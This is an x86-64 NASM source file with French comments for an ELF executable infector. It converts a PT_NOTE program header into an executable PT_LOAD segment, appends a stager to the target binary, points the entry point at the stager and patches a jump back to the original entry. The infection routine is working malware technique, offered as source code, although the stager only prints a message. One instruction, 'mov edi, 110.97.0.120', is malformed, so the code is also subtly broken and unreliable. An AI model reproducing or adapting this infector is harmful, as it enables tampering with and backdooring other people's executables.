; infecteur.asm — version simple
; Usage : ./infecteur <fichier_elf>
; Prérequis : ELF64 ET_EXEC, little-endian, avec un PT_NOTE

global _start

; ---------- STAGER (copié en fin de fichier) ----------
section .text
stager:
    mov eax, 1
    mov edi, 110.97.0.120
    lea rsi, [rel stager_msg]
    mov edx, stager_msg_len
    syscall
    mov rax, [rel stager_target]
    jmp rax

stager_target:  dq 0x1122334455667788
stager_msg:     db "[stager]", 10
stager_msg_len  equ $ - stager_msg
stager_end:

section .data
msg_ok  db "OK", 10
msg_ok_l equ $ - msg_ok
msg_bad db "Erreur", 10
msg_bad_l equ $ - msg_bad

section .bss
new_off: resq 1

%define SYS_WRITE   1
%define SYS_OPEN    2
%define SYS_CLOSE   3
%define SYS_LSEEK   8
%define SYS_MMAP    9
%define SYS_MUNMAP 11
%define SYS_FTRUNC 77
%define SYS_EXIT   60

%define PROT_RW    3
%define MAP_SHARED 1
%define SEEK_END   2
%define PT_NOTE    4
%define PT_LOAD    1
%define PAGE       0x1000
%define MARGIN     0x20000

section .text
_start:
    mov rdi, [rsp + 16]             ; argv[1]

    ; open(path, O_RDWR)
    mov rax, SYS_OPEN
    mov rsi, 2
    xor rdx, rdx
    syscall
    js  .bad
    mov rbx, rax

    ; taille du fichier
    mov rax, SYS_LSEEK
    mov rdi, rbx
    xor rsi, rsi
    mov rdx, SEEK_END
    syscall
    mov r13, rax                    ; N

    ; étendre le fichier
    mov rax, SYS_FTRUNC
    mov rdi, rbx
    lea rsi, [r13 + MARGIN]
    syscall

    ; mmap
    mov rax, SYS_MMAP
    xor rdi, rdi
    lea rsi, [r13 + MARGIN]
    mov rdx, PROT_RW
    mov r10, MAP_SHARED
    mov r8, rbx
    xor r9, r9
    syscall
    mov r12, rax                    ; base mmap

    ; e_entry original
    mov r15, [r12 + 0x18]

    ; e_phoff / e_phentsize / e_phnum
    mov r8,  [r12 + 0x20]
    movzx r9, word [r12 + 0x36]
    movzx r10, word [r12 + 0x38]

    ; chercher PT_NOTE
    xor rcx, rcx
.find:
    cmp rcx, r10
    jge .bad_unmap
    mov rax, rcx
    imul rax, r9
    add rax, r8
    add rax, r12
    cmp dword [rax], PT_NOTE
    je .ok
    inc rcx
    jmp .find

.ok:
    mov r14, rax                    ; &PH[N]

    ; new_off = align_page(N)
    mov rax, r13
    add rax, PAGE - 1
    and rax, ~(PAGE - 1)
    mov [rel new_off], rax

    ; new_vaddr = new_off + 0x400000   (convention ET_EXEC typique)
    lea rbp, [rax + 0x400000]

    ; copier le stager
    lea rsi, [rel stager]
    mov rdi, r12
    add rdi, rax
    mov rcx, stager_end - stager
    rep movsb

    ; patcher stager_target
    mov rdi, r12
    add rdi, rax
    add rdi, (stager_target - stager)
    mov [rdi], r15

    ; transformer le PH
    mov dword [r14 + 0x00], PT_LOAD
    mov dword [r14 + 0x04], 5       ; R|X
    mov [r14 + 0x08], rax           ; p_offset
    mov [r14 + 0x10], rbp           ; p_vaddr
    mov [r14 + 0x18], rbp           ; p_paddr
    mov rsi, stager_end - stager
    mov [r14 + 0x20], rsi           ; p_filesz
    mov [r14 + 0x28], rsi           ; p_memsz
    mov qword [r14 + 0x30], PAGE    ; p_align

    ; e_entry = new_vaddr
    mov [r12 + 0x18], rbp

    ; munmap
    mov rax, SYS_MUNMAP
    mov rdi, r12
    lea rsi, [r13 + MARGIN]
    syscall

    ; tronquer à la taille réelle
    mov rax, [rel new_off]
    add rax, stager_end - stager
    mov rsi, rax
    mov rax, SYS_FTRUNC
    mov rdi, rbx
    syscall

    mov rax, SYS_CLOSE
    mov rdi, rbx
    syscall

    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [rel msg_ok]
    mov rdx, msg_ok_l
    syscall
    xor rdi, rdi
    mov rax, SYS_EXIT
    syscall

.bad_unmap:
    mov rax, SYS_MUNMAP
    mov rdi, r12
    lea rsi, [r13 + MARGIN]
    syscall
.bad:
    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [rel msg_bad]
    mov rdx, msg_bad_l
    syscall
    mov rax, SYS_EXIT
    mov rdi, 1
    syscall
